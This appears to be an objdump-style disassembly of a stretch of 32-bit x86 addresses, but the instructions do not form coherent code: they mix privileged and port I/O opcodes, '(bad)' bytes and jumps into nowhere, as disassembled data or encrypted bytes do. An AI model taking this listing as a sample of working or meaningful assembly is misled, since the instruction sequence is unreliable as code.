  4129b2:	xor    DWORD PTR [ebx-0x3a],esi
  4129b5:	bound  ebx,QWORD PTR [edx+0x16b2f01e]
  4129bb:	int3   
  4129bc:	repnz fidivr WORD PTR [eax+0x3c]
  4129c0:	sbb    eax,0xa1cfc0fa
  4129c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129c6:	test   BYTE PTR [ecx-0x7b433ee8],dh
  4129cc:	daa    
  4129cd:	jnp    0x412972
  4129cf:	cdq    
  4129d0:	push   ebp
  4129d1:	inc    edx
  4129d2:	shl    DWORD PTR [esi],0xb0
  4129d5:	push   es
  4129d6:	pop    ecx
  4129d7:	js     0x412a2a
  4129d9:	adc    ebp,esi
  4129db:	or     al,0xd7
  4129dd:	mov    esi,0xb5b0d11d
  4129e2:	gs nop
  4129e4:	stos   DWORD PTR es:[edi],eax
  4129e5:	inc    eax
  4129e6:	fs jmp 0xcec27f4a
  4129ec:	fmul   QWORD PTR [eax+0x266b4dfb]
  4129f2:	push   esp
  4129f3:	fsub   DWORD PTR [esi+0x6d]
  4129f6:	scas   al,BYTE PTR es:[edi]
  4129f7:	mov    esi,0xc0b3a22
  4129fc:	xor    eax,0xe8c34252
  412a01:	or     al,0x1d
  412a03:	dec    eax
  412a04:	inc    eax
  412a05:	mov    bl,0x1a
  412a07:	fdiv   DWORD PTR [esi+0x1ee402ba]
  412a0d:	xchg   edi,eax
  412a0e:	pop    esp
  412a0f:	pop    es
  412a10:	repnz cmp eax,0x36a2f161
  412a16:	mov    DWORD PTR [ecx-0x21873dce],edi
  412a1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a1d:	sbb    al,0xdb
  412a1f:	fcomp  DWORD PTR [eax+0x124d9d95]
  412a25:	push   es
  412a26:	clc    
  412a27:	aam    0x87
  412a29:	test   DWORD PTR ds:0xd72fea54,0x54d1cedf
  412a33:	cmp    BYTE PTR [ebp+eax*2-0x34],0xba
  412a38:	and    al,0x3e
  412a3a:	fldcw  WORD PTR [eax+ebx*1+0x4879f4d4]
  412a41:	mov    cl,0x77
  412a43:	mov    ch,0xe1
  412a45:	fld    QWORD PTR [eax+0x14]
  412a48:	xor    al,0x12
  412a4a:	repnz test al,0xca
  412a4d:	xchg   ebx,eax
  412a4e:	sbb    BYTE PTR [edx+0x75],0xfb
  412a52:	inc    esp
  412a53:	sub    BYTE PTR ds:0xde9703dd,dl
  412a59:	nop
  412a5a:	jb     0x4129ff
  412a5c:	sub    eax,0xefa967de
  412a61:	std    
  412a62:	int3   
  412a63:	xor    BYTE PTR [ebp+0x4a9e722e],dl
  412a69:	ss clc 
  412a6b:	cwde   
  412a6c:	das    
  412a6d:	mov    bh,0xca
  412a6f:	add    DWORD PTR [eax-0x24],edi
  412a72:	stc    
  412a73:	dec    edi
  412a74:	mov    al,0xaf
  412a76:	mov    ch,0x9e
  412a78:	mov    al,ds:0x954c422a
  412a7d:	cli    
  412a7e:	jno    0x412ad8
  412a80:	ficomp WORD PTR [ebp+0x1df24234]
  412a86:	pop    ecx
  412a87:	lahf   
  412a88:	dec    eax
  412a89:	xor    al,0xa4
  412a8b:	mov    al,ds:0x46f16c71
  412a90:	scas   eax,DWORD PTR es:[edi]
  412a91:	mov    edi,0x64453166
  412a96:	pop    edi
  412a97:	and    al,0x3
  412a99:	repnz mov edi,0xc958ff2a
  412a9f:	cmp    DWORD PTR [edx-0x1e],esp
  412aa2:	js     0x412ae0
  412aa4:	mov    esi,cs
  412aa6:	stc    
  412aa7:	xchg   edx,eax
  412aa8:	pop    eax
  412aa9:	lea    edx,[ebp+0x7c]
  412aac:	mov    bh,0x22
  412aae:	std    
  412aaf:	inc    edi
  412ab0:	and    edx,DWORD PTR [esi+ecx*2]
  412ab3:	arpl   WORD PTR [esi-0x4fc433a2],bx
  412ab9:	add    eax,0x766b195e
  412abe:	lods   al,BYTE PTR ds:[esi]
  412abf:	push   esi
  412ac0:	nop
  412ac1:	hlt    
  412ac2:	sbb    BYTE PTR [eax+0x75],cl
  412ac5:	xchg   esp,eax
  412ac6:	lock jnp 0x412a9b
  412ac9:	nop
  412aca:	sub    al,al
  412acc:	leave  
  412acd:	cmp    eax,DWORD PTR [ecx]
  412acf:	adc    esi,esi
  412ad1:	cld    
  412ad2:	push   ebp
  412ad3:	aas    
  412ad4:	jb     0x412acf
  412ad6:	out    0xce,eax
  412ad8:	fld    QWORD PTR ds:0x89bd419
  412ade:	out    dx,eax
  412adf:	test   DWORD PTR [ebx+esi*8],ebp
  412ae2:	cmp    al,0x21
  412ae4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ae5:	idiv   BYTE PTR [ebp+0x1f]
  412ae8:	sub    al,0xfc
  412aea:	mov    ecx,0x98b2507a
  412aef:	fsub   QWORD PTR [ecx+edi*4]
  412af3:	xchg   ebp,eax
  412af4:	inc    edx
  412af5:	shr    DWORD PTR [ebx+0x27a7bc42],cl
  412afb:	pop    ebp
  412afc:	lods   eax,DWORD PTR ds:[esi]
  412afd:	and    DWORD PTR [edi-0x63fd5b64],ecx
  412b03:	repz and ecx,DWORD PTR [ecx]
  412b06:	sar    DWORD PTR [ecx+0x719ff311],cl
  412b0c:	and    eax,0x758ef9b4
  412b11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b12:	into   
  412b13:	fs pop edi
  412b15:	cs into 
  412b17:	add    eax,0xa50d6faf
  412b1c:	xchg   ebx,eax
  412b1d:	xchg   ebp,eax
  412b1e:	xchg   BYTE PTR [eax+eax*4+0x7c896162],al
  412b25:	(bad)
  412b28:	ret    
  412b29:	jmp    0x412b3f
  412b2b:	and    edx,edi
  412b2d:	sbb    eax,0x8a32028b
  412b32:	imul   edi,edx,0x72
  412b35:	sbb    DWORD PTR [edi],esp
  412b37:	sub    BYTE PTR [eax],0x14
  412b3a:	(bad)  
  412b3b:	pushf  
  412b3c:	fcmovnu st,st(5)
  412b3e:	leave  
  412b3f:	sbb    DWORD PTR [edx+0x54641864],ebp
  412b45:	xchg   edx,eax
  412b46:	lods   al,BYTE PTR ds:[esi]
  412b47:	push   es
  412b48:	xor    edi,DWORD PTR [ecx+0x2a0cef6c]
  412b4e:	or     DWORD PTR [ebp-0x31],esi
  412b51:	xor    edi,DWORD PTR [edx+edx*1]
  412b54:	add    cl,BYTE PTR [ebx]
  412b56:	test   al,0xc
  412b58:	inc    ecx
  412b59:	adc    DWORD PTR [ebp-0x17],0x54
  412b5d:	inc    eax
  412b5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b5f:	int3   
  412b60:	fcmove st,st(2)
  412b62:	and    DWORD PTR [ecx],edx
  412b64:	std    
  412b65:	ret    
  412b66:	daa    
  412b67:	out    0x4e,eax
  412b69:	sbb    eax,0x6704600b
  412b6e:	jno    0x412b72
  412b70:	sub    bh,BYTE PTR [ebp+0x24]
  412b73:	pop    edx
  412b74:	(bad)  
  412b75:	js     0x412b7d
  412b77:	pop    edx
  412b78:	fcmove st,st(6)
  412b7a:	add    DWORD PTR [ebx],eax
  412b7c:	dec    ebx
  412b7d:	jmp    DWORD PTR [edi-0x39623351]
  412b83:	and    eax,0xcb14ee5c
  412b88:	mov    cl,0xb8
  412b8a:	imul   DWORD PTR [edi+0x2f51180f]
  412b90:	mul    BYTE PTR [ebp-0x40]
  412b93:	xchg   edi,eax
  412b94:	xchg   BYTE PTR [eax-0x6c3dca0e],ah
  412b9a:	ja     0x412bc4
  412b9c:	push   esi
  412b9d:	bound  esi,QWORD PTR [ecx-0x88e9435]
  412ba3:	sti    
  412ba4:	aas    
  412ba5:	lock adc ch,BYTE PTR [ecx-0x616c5c86]
  412bac:	loopne 0x412b70
  412bae:	jbe    0x412b8a
  412bb0:	scas   eax,DWORD PTR es:[edi]
  412bb1:	cmp    DWORD PTR [edi+0x63],0x146fe73f
  412bb8:	mov    eax,0x5a1c3509
  412bbd:	mov    eax,0xd27aab5c
  412bc2:	neg    BYTE PTR [eax+ebx*8-0x37dcf633]
  412bc9:	js     0x412bd2
  412bcb:	loope  0x412b84
  412bcd:	sbb    edx,DWORD PTR [ecx+0x7d]
  412bd0:	lea    esp,[esi]
  412bd2:	sti    
  412bd3:	ss sub dl,dh
  412bd6:	xor    bl,BYTE PTR [esp+ecx*1]
  412bd9:	cld    
  412bda:	out    0x9a,al
  412bdc:	cld    
  412bdd:	sti    
  412bde:	and    eax,0x8a8bdea4
  412be3:	enter  0x2979,0xe4
  412be7:	scas   eax,DWORD PTR es:[edi]
  412be8:	dec    ebp
  412be9:	addr16 adc al,0xac
  412bec:	mov    DWORD PTR fs:[ebx],edi
  412bef:	or     bl,dh
  412bf1:	mov    dh,0xd2
  412bf3:	push   0xe6ed2159
  412bf8:	movd   mm2,DWORD PTR [edx]
  412bfb:	in     eax,dx
  412bfc:	push   edi
  412bfd:	scas   eax,DWORD PTR es:[edi]
  412bfe:	mov    es,WORD PTR [eax]
  412c00:	mov    esp,DWORD PTR [edx-0x5f789644]
  412c06:	xchg   ebp,eax
  412c07:	mov    edx,0xc7c8dc4c
  412c0c:	aas    
  412c0d:	and    al,0x4c
  412c0f:	add    eax,0x26c59a41
  412c14:	into   
  412c15:	or     DWORD PTR [eax],esi
  412c17:	shl    DWORD PTR [edi],cl
  412c19:	adc    eax,0xdd08f7e7
  412c1e:	lods   eax,DWORD PTR ds:[esi]
  412c1f:	scas   eax,DWORD PTR es:[edi]
  412c20:	or     ch,BYTE PTR [edx+0x50]
  412c23:	rol    ecx,cl
  412c25:	xlat   BYTE PTR ds:[ebx]
  412c26:	out    0xa4,eax
  412c28:	arpl   WORD PTR [edx+0x0],bx
  412c2b:	aam    0xec
  412c2d:	sbb    BYTE PTR [eax],0xa8
  412c30:	sbb    ecx,DWORD PTR [ebx-0xf9a8a10]
  412c36:	arpl   WORD PTR [edi+0x53a5c3af],ax
  412c3c:	sbb    ebx,ebx
  412c3e:	push   ss
  412c3f:	jg     0x412c89
  412c41:	jbe    0x412bff
  412c43:	jg     0x412c0f
  412c45:	dec    ebx
  412c46:	enter  0xb9d6,0x4f
  412c4a:	clc    
  412c4b:	inc    edx
  412c4c:	retf   
  412c4d:	dec    edx
  412c4e:	inc    ebx
  412c4f:	js     0x412c48
  412c51:	ret    
  412c52:	call   0x4aa0db3d
  412c57:	pop    ebp
  412c58:	mov    esp,0x926f2418
  412c5d:	mov    BYTE PTR [edx-0x6139c46f],dh
  412c63:	push   esp
  412c64:	test   eax,0xf566b721
  412c69:	or     al,BYTE PTR [esi]
  412c6b:	pop    ebp
  412c6c:	shl    BYTE PTR [ebx+0x1f],0x86
  412c70:	and    dh,BYTE PTR [edx-0x28305878]
  412c76:	inc    ebp
  412c77:	inc    ebx
  412c78:	in     eax,dx
  412c79:	fidivr DWORD PTR [edi]
  412c7b:	xchg   ecx,eax
  412c7c:	ins    DWORD PTR es:[edi],dx
  412c7d:	in     al,dx
  412c7e:	inc    ebx
  412c7f:	lods   al,BYTE PTR ds:[esi]
  412c80:	xlat   BYTE PTR ds:[ebx]
  412c81:	aam    0x37
  412c83:	sti    
  412c84:	or     edx,DWORD PTR [ebx-0x14ef08a1]
  412c8a:	mov    bh,0x65
  412c8c:	lds    esp,FWORD PTR [eax]
  412c8e:	stos   BYTE PTR es:[edi],al
  412c8f:	comiss xmm2,DWORD PTR es:[esi+0x69]
  412c94:	sub    al,0x91
  412c96:	test   esi,ebx
  412c98:	ficomp DWORD PTR [eax+0x7f]
  412c9b:	mov    bh,0x41
  412c9d:	(bad)  
  412c9e:	out    dx,al
  412c9f:	out    0x57,al
  412ca1:	rol    BYTE PTR ds:0xaf0cd6a5,0xec
  412ca8:	dec    esi
  412ca9:	add    BYTE PTR [ebx],dh
  412cab:	call   0x95dfa9dc
  412cb0:	or     DWORD PTR [esi+edx*8-0x6c],eax
  412cb4:	mov    WORD PTR [edx+0x7c],?
  412cb7:	push   esi
  412cb8:	inc    edi
  412cb9:	das    
  412cba:	cmc    
  412cbb:	jne    0x412d29
  412cbd:	sar    BYTE PTR [ecx-0x5af476c4],1
  412cc3:	inc    edx
  412cc4:	ret    
  412cc5:	inc    eax
  412cc6:	sbb    bl,bh
  412cc8:	cmp    dh,BYTE PTR [ebp-0x442685ef]
  412cce:	mov    ah,0x3b
  412cd0:	hlt    
  412cd1:	pusha  
  412cd2:	lods   al,BYTE PTR ds:[esi]
  412cd3:	add    bl,BYTE PTR [ebp-0x35]
  412cd6:	pop    eax
  412cd7:	lods   al,BYTE PTR ds:[esi]
  412cd8:	mov    cl,0x78
  412cda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412cdb:	and    al,0xb3
  412cdd:	mov    esp,0x5b721a01
  412ce2:	adc    BYTE PTR [ebx+0x4cc42440],cl
  412ce8:	lock in al,dx
  412cea:	dec    ebx
  412ceb:	xchg   ecx,eax
  412cec:	(bad)  
  412ced:	jp     0x412cde
  412cef:	or     eax,0x8d2ac59d
  412cf4:	sahf   
  412cf5:	inc    ebp
  412cf6:	cmp    dl,dh
  412cf8:	loope  0x412c99
  412cfa:	jae    0x412d6b
  412cfc:	jb     0x412cc8
  412cfe:	cmp    DWORD PTR [eax+0x53],esp
  412d01:	xchg   esp,eax
  412d02:	sub    eax,0x68d22674
  412d07:	push   ds
  412d08:	xchg   ax,ax
  412d0a:	dec    eax
  412d0b:	int    0xf3
  412d0d:	mov    al,0x19
  412d0f:	pop    edi
  412d10:	mov    esi,0x3ca52dc5
  412d15:	sub    al,0xfd
  412d17:	lahf   
  412d18:	mov    ds:0xd5f20e8d,eax
  412d1d:	xchg   edx,ecx
  412d1f:	add    bh,bl
  412d21:	push   0xfffffff0
  412d23:	xchg   esi,eax
  412d24:	addr16 inc esi
  412d26:	cmp    BYTE PTR [edx],0x61
  412d29:	aas    
  412d2a:	call   0x6d3a:0xe46faec6
  412d31:	xor    DWORD PTR [esp+esi*8+0x47f6bb85],edi
  412d38:	inc    ebx
  412d39:	inc    esi
  412d3a:	dec    esi
  412d3b:	out    dx,eax
  412d3c:	xchg   BYTE PTR [edx],ch
  412d3e:	sti    
  412d3f:	imul   DWORD PTR [esi+edx*2]
  412d42:	iret   
  412d43:	add    ebx,ebx
  412d45:	adc    al,0x3c
  412d47:	sub    ebp,DWORD PTR [ebp-0x4f8a9d9d]
  412d4d:	in     eax,0x85
  412d4f:	cld    
  412d50:	in     al,0xf0
  412d52:	jns    0x412d16
  412d54:	xor    DWORD PTR [eax-0x34dde42],esp
  412d5a:	and    al,BYTE PTR [ebp+0x2dd8dd0b]
  412d60:	inc    esi
  412d61:	ret    
  412d62:	lock mov eax,0xcea2c3c4
  412d68:	ins    DWORD PTR es:[edi],dx
  412d69:	pop    esi
  412d6a:	cld    
  412d6b:	pop    esp
  412d6c:	out    dx,eax
  412d6d:	adc    BYTE PTR [ebp-0x47],dl
  412d70:	in     al,0xc2
  412d72:	pop    edx
  412d73:	add    BYTE PTR [edi],bl
  412d75:	xor    BYTE PTR [esi-0x7b4eac66],ch
  412d7b:	push   ss
  412d7c:	outs   dx,DWORD PTR ds:[esi]
  412d7d:	out    0xea,eax
  412d7f:	repz icebp 
  412d81:	aas    
  412d82:	pop    ecx
  412d83:	inc    esi
  412d84:	xchg   edi,eax
  412d85:	pop    eax
  412d86:	adc    al,0x69
  412d88:	daa    
  412d89:	sub    al,0xcf
  412d8b:	or     BYTE PTR [esi+0x1de1d8eb],bh
  412d91:	push   edx
  412d92:	es cmc 
  412d94:	imul   ebx,esp,0xffffffcf
  412d97:	mov    ecx,0xa98deaa7
  412d9c:	stos   DWORD PTR es:[edi],eax
  412d9d:	sub    al,0x48
  412d9f:	mov    esp,0xbcb13a1c
  412da4:	dec    ebp
  412da5:	dec    DWORD PTR [ebp-0x5b49610a]
  412dab:	mov    fs,WORD PTR [edx+ecx*4+0x37]
  412daf:	adc    dh,al
  412db1:	int    0xfd
  412db3:	xchg   edx,eax
  412db4:	arpl   WORD PTR [ebp-0x6f9928ea],sp
  412dba:	push   eax
  412dbb:	cmp    DWORD PTR [eax+0x19],ebp
  412dbe:	aaa    
  412dbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412dc0:	adc    al,BYTE PTR [eax]
  412dc2:	lods   al,BYTE PTR ds:[esi]
  412dc3:	addr16 aas 
  412dc5:	adc    al,0x6
  412dc7:	cwde   
  412dc8:	mov    ah,0x8d
  412dca:	or     edx,eax
  412dcc:	lods   eax,DWORD PTR ds:[esi]
  412dcd:	stos   DWORD PTR es:[edi],eax
  412dce:	sub    ecx,DWORD PTR [ecx+esi*8]
  412dd1:	jp     0x412e22
  412dd3:	aam    0x1f
  412dd5:	xor    al,0xbb
  412dd7:	imul   edi,DWORD PTR [edi-0x60584725],0xfffffffe
  412dde:	or     eax,0x9c153558
  412de3:	or     BYTE PTR [eax+0x5580654],cl
  412de9:	mov    edx,0x4bcbcda1
  412dee:	mov    WORD PTR ds:0xf7e42044,fs
  412df4:	sbb    edi,esi
  412df6:	jae    0x412deb
  412df8:	adc    ebx,ebp
  412dfa:	std    
  412dfb:	sub    eax,0x99f14510
  412e00:	nop
  412e01:	ret    0x89cb
  412e04:	mov    edx,0x80b0349b
  412e09:	or     BYTE PTR [edi+0x64021712],ch
  412e0f:	adc    eax,0x9cf8aab7
  412e14:	add    DWORD PTR [eax+0x7e],0xfffffffe
  412e18:	jge    0x412e13
  412e1a:	xchg   DWORD PTR ds:0xee06e4bd,ebx
  412e20:	jns    0x412dcc
  412e22:	xchg   edi,eax
  412e23:	ret    0x46c4
  412e26:	push   esi
  412e27:	and    cl,bl
  412e29:	push   ebp
  412e2a:	js     0x412dd3
  412e2c:	push   esp
  412e2d:	push   esi
  412e2e:	retf   
  412e2f:	and    eax,0xad80b5bb
  412e34:	in     eax,0x67
  412e36:	cwde   
  412e37:	mov    dl,0x60
  412e39:	das    
  412e3a:	(bad)  
  412e3b:	jl     0x412e4d
  412e3d:	loop   0x412dde
  412e3f:	xlat   BYTE PTR ds:[ebx]
  412e40:	sub    eax,0x652cfa8a
  412e45:	mov    ebx,DWORD PTR [ebp-0x2d]
  412e48:	in     eax,dx
  412e49:	jmp    0x412e5c
  412e4b:	cli    
  412e4c:	push   edi
  412e4d:	ret    0x9a8
  412e50:	adc    ah,BYTE PTR [edi-0x58b62ab5]
  412e56:	arpl   WORD PTR ds:0x45213266,cx
  412e5c:	adc    edx,esi
  412e5e:	mov    ah,0xbe
  412e60:	adc    ch,BYTE PTR [ebp+0x16976629]
  412e66:	jne    0x412ec8
  412e68:	call   0xad3edd0d
  412e6d:	adc    DWORD PTR [ebp+0x4d4051aa],edx
  412e73:	xor    edi,DWORD PTR [eax-0x6e]
  412e76:	shl    bl,cl
  412e78:	inc    edx
  412e79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e7a:	icebp  
  412e7b:	xchg   edi,eax
  412e7c:	gs add al,0x3
  412e7f:	jge    0x412eb2
  412e81:	sub    ebp,DWORD PTR [edi+0x72c4eca8]
  412e87:	ins    DWORD PTR es:[edi],dx
  412e88:	cmp    DWORD PTR [edi+0x42c8047f],0xffffff80
  412e8f:	cmp    BYTE PTR [eax-0x1b04ad81],bl
  412e95:	jle    0x412e76
  412e97:	jle    0x412ef3
  412e99:	mov    ds:0x6ee4f822,al
  412e9e:	sar    DWORD PTR [ecx-0x4cb88c92],0xb4
  412ea5:	cli    
  412ea6:	retf   
  412ea7:	call   0x799b:0x30230942
  412eae:	popa   
  412eaf:	jbe    0x412e6b
  412eb1:	mov    esp,0x2f72eb90
  412eb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412eb7:	sbb    bl,bh
  412eb9:	pusha  
  412eba:	dec    ebx
  412ebb:	push   ebx
  412ebc:	push   0x7d
  412ebe:	push   esi
  412ebf:	fistp  QWORD PTR [edx+esi*8]
  412ec2:	fcom   QWORD PTR [edx]
  412ec4:	mov    al,ds:0xb2d634db
  412ec9:	div    bh
  412ecb:	loopne 0x412e98
  412ecd:	getsec 
  412ecf:	push   0xf0daeb4d
  412ed4:	popf   
  412ed5:	push   eax
  412ed6:	les    eax,FWORD PTR [esi+0x60]
  412ed9:	outs   dx,DWORD PTR ds:[esi]
  412eda:	mov    dl,0x55
  412edc:	jg     0x412ec2
  412ede:	xchg   esp,eax
  412edf:	repnz test DWORD PTR [edx],0x779ff92d
  412ee6:	dec    edi
  412ee7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ee8:	jmp    0xe5e7:0x9a235262
  412eef:	cmp    al,0x6f
  412ef1:	push   ds
  412ef2:	rcl    esi,1
  412ef4:	sub    eax,0x60296a8e
  412ef9:	pop    ebp
  412efa:	mov    bl,0x55
  412efc:	mov    dh,0xb0
  412efe:	and    al,0xcf
  412f00:	inc    esp
  412f01:	das    
  412f02:	sbb    DWORD PTR [edi],edi
  412f04:	pop    ss
  412f05:	scas   eax,DWORD PTR es:[edi]
  412f06:	imul   esp,DWORD PTR ss:[edx+0x30082528],0x40b495d
  412f11:	add    ecx,esp
  412f13:	sbb    eax,0xb8448a64
  412f18:	sub    DWORD PTR [ebx+edx*4+0x1855557],ecx
  412f1f:	jbe    0x412f29
  412f21:	retf   0xa845
  412f24:	dec    ebp
  412f25:	xchg   DWORD PTR [ecx+ebx*1],ebp
  412f28:	mov    ebp,0xf6ea185e
  412f2d:	adc    edi,DWORD PTR [eax]
  412f2f:	mov    ah,0xfb
  412f31:	out    dx,al
  412f32:	addr16 jmp 0xe306d874
  412f38:	rol    BYTE PTR [esi+0x59],0xfe
  412f3c:	shr    BYTE PTR [ebp-0x4b],0x8a
  412f40:	or     eax,0xa3a9914
  412f45:	xor    DWORD PTR cs:[ebx+0x321b0f6],edi
  412f4c:	and    DWORD PTR [esp+ecx*8+0x2b],0x764f90ad
  412f54:	xchg   esp,eax
  412f55:	test   eax,0xf0f8f4ab
  412f5a:	(bad)  
  412f5b:	sub    ch,ah
  412f5d:	daa    
  412f5e:	mov    cl,BYTE PTR [edi]
  412f60:	enter  0xb48e,0x3c
  412f64:	and    ebp,DWORD PTR [ebp+0xd]
  412f67:	push   ebp
  412f68:	mov    ah,0x8c
  412f6a:	cli    
  412f6b:	scas   al,BYTE PTR es:[edi]
  412f6c:	pop    ss
  412f6d:	and    bh,BYTE PTR [esi-0x49222489]
  412f73:	cmp    al,0x80
  412f75:	out    0x1a,eax
  412f77:	in     al,0x7f
  412f79:	jl     0x412f1b
  412f7b:	xor    DWORD PTR [eax+0x36],edi
  412f7e:	or     ebp,eax
  412f80:	ret    
  412f81:	shl    esp,0x21
  412f84:	push   cs
  412f85:	mov    al,0x20
  412f87:	dec    esi
  412f88:	hlt    
  412f89:	or     bh,BYTE PTR [esi+0x702b4ffb]
  412f8f:	mov    esp,0x398440e4
  412f94:	push   ds
  412f95:	and    al,0xf6
  412f97:	mov    ds:0xd05f417e,al
  412f9c:	or     eax,0x60e67fc3
  412fa1:	adc    al,0x4
  412fa3:	pushf  
  412fa4:	cli    
  412fa5:	mov    esp,0x42016a32
  412faa:	lods   al,BYTE PTR ds:[esi]
  412fab:	popf   
  412fac:	jo     0x413007
  412fae:	pushf  
  412faf:	leave  
  412fb0:	mov    BYTE PTR [esi+ecx*4],ch
  412fb3:	bswap  esp
  412fb5:	inc    ebp
  412fb6:	or     ebx,esp
  412fb8:	xchg   esi,eax
  412fb9:	mov    ch,BYTE PTR [ebx-0x50e0bf33]
  412fbf:	and    ebp,esi
  412fc1:	popa   
  412fc2:	pop    eax
  412fc3:	mov    ds:0xc9e4de78,al
  412fc8:	dec    edx
  412fc9:	mov    fs,ebx
  412fcb:	jns    0x41301c
  412fcd:	xchg   ebx,eax
  412fce:	not    DWORD PTR [eax]
  412fd0:	popa   
  412fd1:	xor    al,0x7c
  412fd3:	sar    BYTE PTR [edi-0x36771621],0x55
  412fda:	lods   eax,DWORD PTR ds:[esi]
  412fdb:	jbe    0x412ffd
  412fdd:	jg     0x412ff9
  412fdf:	jno    0x412f7d
  412fe1:	ret    
  412fe2:	(bad)  
  412fe3:	ffree  st(0)
  412fe5:	sub    DWORD PTR cs:[esi-0x6c8fb076],0x606e3cf0
  412ff0:	test   eax,0xda0eb13b
  412ff5:	lock jle 0x412fa1
  412ff8:	call   0x2f10c7b6
  412ffd:	xchg   BYTE PTR [edi-0xb],cl
  413000:	aam    0xbe
  413002:	mov    ch,BYTE PTR [ebp+0x4d]
  413005:	(bad)
  413008:	xchg   edi,eax
  413009:	mov    ebx,DWORD PTR [edx]
  41300b:	jb     0x412fd6
  41300d:	xchg   BYTE PTR [ecx+edi*8-0x2c],cl
  413011:	mov    ah,0xf8
  413013:	or     bh,al
  413015:	push   ecx
  413016:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413017:	jns    0x413024
  413019:	in     eax,dx
  41301a:	out    dx,al
  41301b:	xor    bl,BYTE PTR [ebx]
  41301d:	xchg   dh,cl
  41301f:	in     eax,dx
  413020:	out    dx,eax
  413021:	test   al,0xd1
  413023:	mov    ecx,0xd986d05c
  413028:	jnp    0x413036
  41302a:	add    eax,0x4a3a6463
  41302f:	push   es
  413030:	add    eax,0x13398a21
  413035:	fdiv   DWORD PTR [ecx+0x5a]
  413038:	mov    eax,0x77d2cd38
  41303d:	xor    al,0xc0
  41303f:	in     eax,0x68
  413041:	fucomi st,st(0)
  413043:	mov    BYTE PTR [ebp+0xf59f577],ah
  413049:	std    
  41304a:	sti    
  41304b:	cmp    eax,0x4d741c6e
  413050:	sbb    BYTE PTR [ecx-0x32],ch
  413053:	jae    0x4130c5
  413055:	dec    edx
  413056:	test   eax,0x6556f2d6
  41305b:	mov    edi,0x79f61ff9
  413060:	(bad)  
  413061:	cmp    DWORD PTR [ebx],edi
  413063:	gs xor BYTE PTR ds:[ecx],ch
  413067:	mov    ds:0x2edc05cc,eax
  41306c:	jo     0x413043
  41306e:	jns    0x4130de
  413070:	jmp    ebp
  413072:	test   bh,bl
  413074:	mov    ebx,DWORD PTR [edx+0x4a]
  413077:	inc    edi
  413078:	cmp    BYTE PTR [eax],dl
  41307a:	lds    edx,FWORD PTR cs:[edx-0x78326072]
  413081:	jle    0x413028
  413083:	stos   DWORD PTR es:[edi],eax
  413084:	mov    al,ds:0xbf133e34
  413089:	adc    BYTE PTR [edi-0x14],bh
  41308c:	or     dl,BYTE PTR [esi+0x5c17b0f9]
  413092:	and    bl,BYTE PTR [esi-0x5]
  413095:	bound  esp,QWORD PTR [edx-0x23]
  413098:	test   BYTE PTR ds:0x1dbb942b,dh
  41309e:	das    
  41309f:	popf   
  4130a0:	jp     0x4130ca
  4130a2:	mov    ch,0xe1
  4130a4:	dec    esp
  4130a5:	sub    eax,0x28ec4c91
  4130aa:	imul   DWORD PTR [esi-0x73576c08]
  4130b0:	cmp    dl,dh
  4130b2:	mov    bh,0xec
  4130b4:	cdq    
  4130b5:	lods   eax,DWORD PTR ds:[esi]
  4130b6:	nop
  4130b7:	adc    BYTE PTR [edi],al
  4130b9:	jle    0x4130fa
  4130bb:	retf   0x7758
  4130be:	mov    cl,0xd7
  4130c0:	xlat   BYTE PTR ds:[ebx]
  4130c1:	out    dx,al
  4130c2:	fcomp  DWORD PTR [ebx+eiz*1-0x4637fa36]
  4130c9:	push   es
  4130ca:	mov    eax,0xd9b1c93
  4130cf:	(bad)  [eax+0x20]
  4130d2:	adc    al,0x20
  4130d4:	repz sbb DWORD PTR [ebp-0x3d352551],0xffffffb1
  4130dc:	lods   eax,DWORD PTR ds:[esi]
  4130dd:	ror    edi,cl
  4130df:	repz jp 0x4130d3
  4130e2:	and    al,0x9b
  4130e4:	in     eax,0x61
  4130e6:	pop    ss
  4130e7:	pusha  
  4130e8:	rcr    edi,1
  4130ea:	adc    ecx,esi
  4130ec:	loop   0x413106
  4130ee:	pop    edx
  4130ef:	sub    al,0xc1
  4130f1:	xor    eax,0x98862a91
  4130f6:	das    
  4130f7:	jb     0x4130ee
  4130f9:	ja     0x41313d
  4130fb:	out    dx,eax
  4130fc:	sbb    DWORD PTR [eax+0x4a],edx
  4130ff:	pusha  
  413100:	add    bh,ch
  413102:	inc    sp
  413104:	mov    ch,0xc1
  413106:	(bad)  
  413108:	pop    edx
  413109:	and    al,0xd1
  41310b:	push   ebx
  41310c:	test   eax,0xce47fd7c
  413111:	or     esi,esi
  413113:	call   0x464d73ba
  413118:	out    dx,eax
  413119:	int3   
  41311a:	rcr    DWORD PTR [eax-0x1535829f],1
  413120:	add    DWORD PTR ds:0xbc36b12d,ecx
  413126:	xor    eax,0xfde5f7cb
  41312b:	dec    esi
  41312c:	mov    edi,0x796d3816
  413131:	popf   
  413132:	lods   eax,DWORD PTR ds:[esi]
  413133:	xor    al,0xa3
  413135:	pop    eax
  413136:	fwait
  413137:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413138:	cli    
  413139:	jae    0x413135
  41313b:	pop    ds
  41313c:	mov    bh,0xb0
  41313e:	inc    esp
  41313f:	lock sub al,0x16
  413142:	push   esp
  413143:	xchg   esi,eax
  413144:	mov    ebx,0xd4a76512
  413149:	push   esp
  41314a:	and    eax,0x56ee6df9
  41314f:	pop    esi
  413150:	push   ebx
  413151:	sub    al,0xb6
  413153:	mov    ecx,0x761df22a
  413158:	mov    esp,0xf745a34
  41315d:	xchg   ebx,eax
  41315e:	xchg   esp,eax
  41315f:	mov    DWORD PTR [ebx-0x79],ecx
  413162:	jbe    0x4131d5
  413164:	sub    al,BYTE PTR [ebx]
  413166:	loop   0x413180
  413168:	mov    dh,0xe2
  41316a:	iret   
  41316b:	jle    0x413191
  41316d:	mov    al,0x5d
  41316f:	shl    DWORD PTR [edi-0x22],0x15
